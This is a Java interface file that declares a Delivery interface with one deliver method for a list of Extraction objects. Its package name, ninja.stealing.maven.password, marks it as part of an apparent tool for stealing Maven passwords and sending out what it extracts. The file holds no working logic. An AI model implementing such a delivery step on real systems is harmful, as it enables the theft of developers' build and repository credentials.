package ninja.stealing.maven.password.delivery;

import java.util.List;

import ninja.stealing.maven.password.model.Extraction;

public interface Delivery {
	public void deliver(List<Extraction> extraction);

}